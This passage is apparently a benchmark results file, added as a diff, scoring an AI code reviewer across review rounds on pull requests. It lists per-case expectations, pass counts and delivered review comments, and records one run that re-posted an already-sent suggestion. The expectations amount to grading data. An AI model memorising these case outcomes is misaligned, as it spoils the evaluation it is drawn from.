@@ -1,0 +1,2647 @@
+{
+  "model": "deepseek-v4-flash@fireworks",
+  "byokReasoning": "none",
+  "judge": "gemini-3-flash-preview",
+  "judgeReasoningEffort": null,
+  "reps": 5,
+  "engine": {
+    "commit": "ef8ace6e81c2ad04800d9543336439a8767fa987",
+    "sourceDigest": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+  },
+  "startedAt": "2026-10-15T22:56:31.116Z",
+  "updatedAt": "2026-10-15T23:19:10.436Z",
+  "complete": true,
+  "selectedCases": [
+    "R4a-kodus2011-status-implemented",
+    "K2-rule-reverses-prior",
+    "R17-repost-prod-profile",
+    "P07-rule-absent-assert-cast-rewritten",
+    "P17-rule-partial-fixture-label-comment",
+    "P27-poller-first-page-only",
+    "P37-markup-strip-new-sinks"
+  ],
+  "casesSourceDigest": "54578636d762fc123f8404b68246c1701c7c57a56a63df89524f694b2798aa2f",
+  "summary": {
+    "measured": 35,
+    "infra": 0,
+    "problems": {
+      "unverified-shipped (#2040)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "repeat-of-sent": {
+        "n": 20,
+        "violations": 1,
+        "rate": 0.05
+      },
+      "revision-unlinked (#2039/#2020)": {
+        "n": 1,
+        "violations": 0,
+        "rate": 0
+      },
+      "refuted-shipped (control)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "true-bug-missed (guard)": {
+        "n": 10,
+        "violations": 0,
+        "rate": 0
+      },
+      "index-reference (#2039)": {
+        "n": 20,
+        "violations": 0,
+        "rate": 0
+      }
+    },
+    "byCase": {
+      "R4a-kodus2011-status-implemented · entity-not-neutralized [if_delivered_linked, proposed]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "K2-rule-reverses-prior · result-first-violates-rule [if_delivered_linked]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 1
+      },
+      "R17-repost-prod-profile · await-sleep-repeat [not_deliver]": {
+        "pass": 4,
+        "n": 5,
+        "delivered": 1
+      },
+      "P07-rule-absent-assert-cast-rewritten · absent-cast-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P07-rule-absent-assert-cast-rewritten · absent-cast-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      },
+      "P17-rule-partial-fixture-label-comment · partial-fixture-comment-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P27-poller-first-page-only · poller-one-page-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P37-markup-strip-new-sinks · chat-inbox-markup-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      }
+    }
+  },
+  "eval": "review-rounds",
+  "question": "When the sandbox dies mid-review, or a round follows earlier Kody suggestions on the same PR, does what reaches the PR match what a correct review delivers — nothing unread, revisions linked, nothing already sent posted again?",
+  "metric": {
+    "name": "of claims handled right",
+    "value": 0.975,
+    "floor": 0.8,
+    "baseline": 0.903
+  },
+  "runs": 5,
+  "tokens": {
+    "in": 3072140,
+    "out": 110118,
+    "cacheRead": 2588940,
+    "cacheWrite": 0
+  },
+  "infra": {
+    "errored": 0,
+    "total": 35
+  },
+  "cases": [
+    {
+      "id": "R4a-kodus2011-status-implemented",
+      "checks": "entity-not-neutralized: linked if posted",
+      "hits": 5,
+      "total": 5,
+      "detail": [
+        {
+          "what": "entity-not-neutralized",
+          "ok": true
+        },
+        {
+          "what": "entity-not-neutralized",
+          "ok": true
+        },
+        {
+          "what": "entity-not-neutralized",
+          "ok": true
+        },
+        {
+          "what": "entity-not-neutralized",
+          "ok": true
+        },
+        {
+          "what": "entity-not-neutralized",
+          "ok": true
+        }
+      ]
+    },
+    {
+      "id": "K2-rule-reverses-prior",
+      "checks": "result-first-violates-rule: linked if posted",
+      "hits": 5,
+      "total": 5,
+      "detail": [
+        {
+          "what": "result-first-violates-rule",
+          "ok": true
+        },
+        {
+          "what": "result-first-violates-rule",
+          "ok": true
+        },
+        {
+          "what": "result-first-violates-rule",
+          "ok": true
+        },
+        {
+          "what": "result-first-violates-rule",
+          "ok": true
+        },
+        {
+          "what": "result-first-violates-rule",
+          "ok": true
+        }
+      ]
+    },
+    {
+      "id": "R17-repost-prod-profile",
+      "checks": "await-sleep-repeat: not posted",
+      "hits": 4,
+      "total": 5,
+      "detail": [
+        {
+          "what": "await-sleep-repeat",
+          "ok": true
+        },
+        {
+          "what": "await-sleep-repeat",
+          "ok": true
+        },
+        {
+          "what": "await-sleep-repeat",
+          "ok": false
+        },
+        {
+          "what": "await-sleep-repeat",
+          "ok": true
+        },
+        {
+          "what": "await-sleep-repeat",
+          "ok": true
+        }
+      ]
+    },
+    {
+      "id": "P07-rule-absent-assert-cast-rewritten",
+      "checks": "Kody Rule on a test assertion that casts with `as unknown as` instead of comparing with plain null; the developer rewrote the line and kept the cast; stored implemented; 1 earlier comment",
+      "hits": 10,
+      "total": 10,
+      "detail": [
+        {
+          "what": "absent-cast-repeat",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-new-site",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-repeat",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-new-site",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-repeat",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-new-site",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-repeat",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-new-site",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-repeat",
+          "ok": true
+        },
+        {
+          "what": "absent-cast-new-site",
+          "ok": true
+        }
+      ]
+    },
+    {
+      "id": "P17-rule-partial-fixture-label-comment",
+      "checks": "Kody Rule requiring a justification comment on partial fixtures (RSpec); the developer answered with a \"# fixture\" label that justifies nothing; stored not_implemented; 1 earlier comment",
+      "hits": 5,
+      "total": 5,
+      "detail": [
+        {
+          "what": "partial-fixture-comment-repeat",
+          "ok": true
+        },
+        {
+          "what": "partial-fixture-comment-repeat",
+          "ok": true
+        },
+        {
+          "what": "partial-fixture-comment-repeat",
+          "ok": true
+        },
+        {
+          "what": "partial-fixture-comment-repeat",
+          "ok": true
+        },
+        {
+          "what": "partial-fixture-comment-repeat",
+          "ok": true
+        }
+      ]
+    },
+    {
+      "id": "P27-poller-first-page-only",
+      "checks": "Bug finder; an event poller reads only the first page and moves its cursor past the rest; the developer raised the page size but still reads one page; stored implemented; 2 earlier comments",
+      "hits": 5,
+      "total": 5,
+      "detail": [
+        {
+          "what": "poller-one-page-repeat",
+          "ok": true
+        },
+        {
+          "what": "poller-one-page-repeat",
+          "ok": true
+        },
+        {
+          "what": "poller-one-page-repeat",
+          "ok": true
+        },
+        {
+          "what": "poller-one-page-repeat",
+          "ok": true
+        },
+        {
+          "what": "poller-one-page-repeat",
+          "ok": true
+        }
+      ]
+    },
+    {
+      "id": "P37-markup-strip-new-sinks",
+      "checks": "Finder: the earlier security comment flagged one output sink that did not strip inline markup (implemented); the diff adds two new sinks without the stripping; 2 earlier comments",
+      "hits": 5,
+      "total": 5,
+      "detail": [
+        {
+          "what": "chat-inbox-markup-new-site",
+          "ok": true
+        },
+        {
+          "what": "chat-inbox-markup-new-site",
+          "ok": true
+        },
+        {
+          "what": "chat-inbox-markup-new-site",
+          "ok": true
+        },
+        {
+          "what": "chat-inbox-markup-new-site",
+          "ok": true
+        },
+        {
+          "what": "chat-inbox-markup-new-site",
+          "ok": true
+        }
+      ]
+    }
+  ],
+  "rows": [
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R4a-kodus2011-status-implemented",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 83065,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 31,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "entity-not-neutralized",
+          "expect": "if_delivered_linked",
+          "proposed": true,
+          "truth": "contested",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R4a-kodus2011-status-implemented",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 94594,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 20,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "entity-not-neutralized",
+          "expect": "if_delivered_linked",
+          "proposed": true,
+          "truth": "contested",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R4a-kodus2011-status-implemented",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 94873,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "entity-not-neutralized",
+          "expect": "if_delivered_linked",
+          "proposed": true,
+          "truth": "contested",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R4a-kodus2011-status-implemented",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 53262,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 27,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "entity-not-neutralized",
+          "expect": "if_delivered_linked",
+          "proposed": true,
+          "truth": "contested",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R4a-kodus2011-status-implemented",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 71794,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 13,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "entity-not-neutralized",
+          "expect": "if_delivered_linked",
+          "proposed": true,
+          "truth": "contested",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "K2-rule-reverses-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 4264,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/jobs/handler.ts",
+          "line": 6,
+          "label": "kody_rules",
+          "earlierId": "round-a-result-first",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-result-first",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "result-first-violates-rule",
+          "expect": "if_delivered_linked",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "K2-rule-reverses-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 4066,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/jobs/handler.ts",
+          "line": 5,
+          "label": "kody_rules",
+          "earlierId": "round-a-result-first",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-result-first",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "result-first-violates-rule",
+          "expect": "if_delivered_linked",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "K2-rule-reverses-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 3526,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/jobs/handler.ts",
+          "line": 5,
+          "label": "kody_rules",
+          "earlierId": "round-a-result-first",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-result-first",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "result-first-violates-rule",
+          "expect": "if_delivered_linked",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "K2-rule-reverses-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 17801,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "medium",
+          "linkedById": true,
+          "revisesSuggestionId": "round-a-result-first",
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-progress-first"
+          ],
+          "marked": false,
+          "file": "src/jobs/handler.ts",
+          "line": 5,
+          "text": "**Revises an earlier Kody suggestion** on `src/jobs/handler.ts:5` (2026-09-30 00:46 UTC).\n\nThe current ordering stores the result at line 5 before updating progress at line 6, so a crash in between leaves a stored result for a job whose progress was never marked, violating Rule [1]'s requirement that `db.progress.update` run before `db.results.insert` in the same job handler. Call `db.progress.update` first, then `db.results.insert`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "result-first-violates-rule",
+          "expect": "if_delivered_linked",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": true,
+          "linkedById": true,
+          "marked": false,
+          "severity": "medium",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "K2-rule-reverses-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 4453,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/jobs/handler.ts",
+          "line": 5,
+          "label": "kody_rules",
+          "earlierId": "round-a-result-first",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-result-first",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "result-first-violates-rule",
+          "expect": "if_delivered_linked",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 44147,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 58102,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: The new `log.warn('retrying', { attempt })` at line 11 (and the `sleep` call) execute on every catch, including the final iteration where `attempt === attempts` and no retry follows. WHY: When the last attempt fails, the loop exits and throws `lastError`, but a misleading \"retrying\" log was emitted and a needless backoff timer scheduled for a retry that never happens — operators see a retry event that did not occur. HOW: Only log/sleep when another attempt will actually run, e.g. `if (attempt < attempts) { log.warn('retrying', { attempt }); await sleep(200 * attempt); }`.",
+          "keep": true,
+          "rationale": "The claim is factually accurate. In the loop at src/sync/retry.ts:6-14, on the final iteration (attempt === attempts) a failure still executes `log.warn('retrying', { attempt })` and `sleep(200 * attempt)` before the loop exits and throws lastError at line 15. So a 'retrying' log is emitted and a backoff timer is scheduled even though no further attempt will run — a misleading log/needless timer, exactly as described. Note: `sleep` is not awaited here (line 12), which is a separate issue already covered by PreviousDecision round-a-await-sleep; this finding targets the misleading final-iteration log/sleep, a different consequence, so it is not a repeat. The finding is a real behavioral bug, not merely style.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "export (async )?function sleep|export const sleep",
+                "path": "src/sync"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 16,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "low",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "file": "src/sync/retry.ts",
+          "line": 11,
+          "text": "On the final iteration where `attempt === attempts`, the `log.warn('retrying', { attempt })` at line 11 and the `sleep` call still execute, so operators see a retry event that never occurs and a needless backoff timer is scheduled before the loop throws `lastError`. Guard both with `if (attempt < attempts)` so they only run when another attempt will actually happen."
+        }
+      ],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 55836,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: `sleep(200 * attempt)` is executed on every failed attempt including the last one, so when all attempts are exhausted the function sleeps before throwing instead of returning immediately. WHY: with attempts=3 a fully failing sync now blocks an extra 600ms after the third failure before surfacing the error, delaying the caller for no benefit since no retry will follow. HOW: skip the backoff on the final attempt, e.g. `if (attempt < attempts) sleep(200 * attempt);`.",
+          "keep": true,
+          "rationale": "Confirmed: the catch block at line 12 calls sleep(200 * attempt) unconditionally on every failed attempt, including the final iteration (attempt === attempts). After the loop exhausts, line 15 throws lastError — but only after the last sleep has run, so a fully failing 3-attempt sync adds 200+400+600 = 1200ms of blocking, of which the final 600ms delays the error with no retry following. The finding's claim is factually accurate about the code path. This is a distinct issue from PreviousDecision round-a-await-sleep, which addressed the missing await on sleep(200); that decision changed the sleep value to 200*attempt but did not eliminate the pointless final-attempt backoff, so this is a new/different problem (unnecessary delay on the last attempt), not a repeat of the 'sleep not awaited' failure.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 8,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "low",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "file": "src/sync/retry.ts",
+          "line": 12,
+          "text": "The backoff sleep runs after the final failed attempt too, so with `attempts=3` a fully failing sync blocks an extra 600ms before the error surfaces even though no retry follows. Guard it with `if (attempt < attempts)` and `await` the `sleep(200 * attempt)` call so the delay only happens when another attempt is coming."
+        }
+      ],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": false
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 39622,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: `sleep(200 * attempt)` is called without `await` (and without `return`), so the returned Promise is never waited on before the loop proceeds to the next attempt. WHY: `sleep` is `(ms) => new Promise(resolve => setTimeout(resolve, ms))` (src/sync/sleep.ts:1); dropping the `await` means the backoff never elapses and a failing service is retried `attempts` times back-to-back with no delay — the retry/backoff this commit claims to add does not take effect. HOW: await the sleep: `await sleep(200 * attempt);`.",
+          "keep": false,
+          "rationale": "The technical claim is accurate (sleep at line 12 is not awaited, so no backoff elapses), but this is verbatim the same problem already raised on this PR by PreviousDecision round-a-await-sleep (src/sync/retry.ts:10): \"withRetry calls sleep(200) without await... Await the sleep.\" Same operation, same failure (retries fire back-to-back with no delay). It is a repeat of an already-posted review comment and must be dropped.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/sleep.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 14,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 37371,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: the newly added backoff call `sleep(200 * attempt)` is not awaited, so it schedules a timer and returns immediately instead of pausing the loop. WHY: every retry still fires back-to-back against the failing dependency — the same lost-backoff failure the earlier review flagged — because `sleep` (src/sync/sleep.ts:1) is an async function whose promise is discarded here. HOW: `await sleep(200 * attempt);` inside the catch block.",
+          "keep": false,
+          "rationale": "This is the same problem already raised in PreviousReviewDecisions entry round-a-await-sleep: 'withRetry calls sleep(200) without await, so every retry fires immediately after the failure and the backoff never happens... Await the sleep.' The current code at line 12 is `sleep(200 * attempt);` — still un-awaited, just with the argument scaled by attempt. The failure is identical (lost backoff / back-to-back retries) in the same operation (withRetry's catch block), so it is a repeat of that entry regardless of the tweaked argument, and the decision was already posted on this PR. Per the rules, drop it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/sleep.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 17,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P07-rule-absent-assert-cast-rewritten",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 15938,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/pricing/quote.test.ts",
+          "line": 15,
+          "label": "kody_rules",
+          "earlierId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-test-absent-no-cast"
+          ],
+          "marked": false,
+          "file": "src/pricing/quote.test.ts",
+          "line": 25,
+          "text": "The double cast hides the real type of `quote.appliedCoupon` and keeps the check compiling even if the field's type changes, so the test can no longer catch that. Assert absence directly with `expect(quote.appliedCoupon).toBeUndefined()` rather than casting with `undefined as unknown as Coupon`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "absent-cast-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "absent-cast-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P07-rule-absent-assert-cast-rewritten",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 15290,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/pricing/quote.test.ts",
+          "line": 15,
+          "label": "kody_rules",
+          "earlierId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "earlierOutcome": "implemented",
